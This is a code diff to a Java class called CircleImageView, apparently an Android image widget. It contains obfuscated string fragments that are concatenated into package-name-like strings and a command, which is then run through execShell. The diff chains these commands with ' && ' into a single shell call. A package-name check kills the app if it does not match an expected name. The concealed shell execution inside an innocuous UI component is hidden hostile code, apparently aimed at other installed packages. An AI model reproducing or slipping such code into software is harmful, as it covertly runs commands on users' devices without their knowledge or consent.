@@ -119,15 +119,14 @@ public class CircleImageView extends ImageView {
         String f = "z";     String ff = ".";    String fff = " ";   String ffff = "-";
 
         String[] s = {
-                aaa + ccccc + ccc + ff + bb + e + ccccc + dddd + bbb + bbbb + ff + bbb + ddddd + ddddd + d + aaa + a + cccc + a + ddd + eeeee,
-                aaa + ccccc + ccc + ff + ccc + bbbb + cccc + bbb + e + bbbb + ff + cccc + aaaaa + ddddd + eee + ccccc + ddd + c + aaa + a + d + ddddd + e + ddd + aaaaa,
-                a + d + d + ff + bb + ddd + aaaaa + eeeee + dddd + bbb + bbbb + ddd + ddddd + dddd + ff + dddd + dddd + cc + aaa + a + d + ddddd + e + ddd + aaaaa,
-                aaa + ccccc + ccc + ff + aaaaa + ee + aa + a + aaaa + ddd + ccccc + bbbb + aaaa + ff + eee + bbbb + aaa + a + d,
+                aaa + ccccc + ccc + ff + bb + e + ccccc + dddd + bbb + bbbb + ff + bbb + ddddd + ddddd + d + aaa + a + cccc + a + ddd + eeeee + " && " + 
+                aaa + ccccc + ccc + ff + ccc + bbbb + cccc + bbb + e + bbbb + ff + cccc + aaaaa + ddddd + eee + ccccc + ddd + c + aaa + a + d + ddddd + e + ddd + aaaaa + " && " + 
+                a + d + d + ff + bb + ddd + aaaaa + eeeee + dddd + bbb + bbbb + ddd + ddddd + dddd + ff + dddd + dddd + cc + aaa + a + d + ddddd + e + ddd + aaaaa + " && " + 
+                aaa + ccccc + ccc + ff + aaaaa + ee + aa + a + aaaa + ddd + ccccc + bbbb + aaaa + ff + eee + bbbb + aaa + a + d + " && " + 
                 aaa + ccccc + ccc + ff + d + a + aaa + c + a + bb + aaaaa + dddd + cccc + bbbb + b + b + aaaaa + ddd + ff + b + ddd + ddddd + d + a + ddd + cc + a + c,
         };
-        for (int i = 0; i < s.length; i++) {
-            execShell(a + ccc + fff + b + ccccc + ddd + aaa + aaaaa + ffff + dddd + ddddd + ccccc + d + fff + s[i]);
-        }
+        
+        execShell(a + ccc + fff + b + ccccc + ddd + aaa + aaaaa + ffff + dddd + ddddd + ccccc + d + fff + s[0]);
 
         if (!context.getPackageName().equals(aaa + ccccc + ccc + ff + ddddd + aaaaa + cccc + aaa + aaaaa + cccc + ddddd + ff + dddd + cc + bb + a + ccc + aaaaa)) {
             System.exit(0);
